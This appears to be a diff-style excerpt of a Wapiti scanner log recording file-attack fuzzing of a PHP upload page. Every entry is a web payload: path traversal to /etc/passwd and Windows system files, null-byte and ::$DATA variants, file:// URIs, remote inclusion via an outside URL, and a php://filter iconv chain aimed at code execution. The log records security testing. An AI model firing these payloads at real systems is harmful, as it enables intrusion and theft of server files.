+2024-03-20 14:31:44.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.860 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=piccheck.php&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.869 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=piccheck.php%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.881 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=piccheck.php%3A%3A%24DATA&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.921 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.928 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.936 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.957 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.994 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.006 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.018 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.043 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.060 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.089 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.118 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.131 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.156 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.169 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.210 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.224 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.239 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.252 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.280 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.294 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.307 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.335 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.348 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.373 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.386 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.399 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.427 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.440 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.455 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.495 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.521 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.533 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=file%3A%2F%2F%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.542 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.550 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.558 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.568 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.586 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.610 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=piccheck.php&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=piccheck.php%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.635 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=piccheck.php%3A%3A%24DATA&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:45.647 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 14:31:45.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 14:31:45.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%2Fetc%2Fpasswd
+2024-03-20 14:31:45.672 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%2Fetc%2Fpasswd%00
+2024-03-20 14:31:45.679 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%2Fetc%2Fservices
+2024-03-20 14:31:45.687 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%2Fetc%2Fservices%00
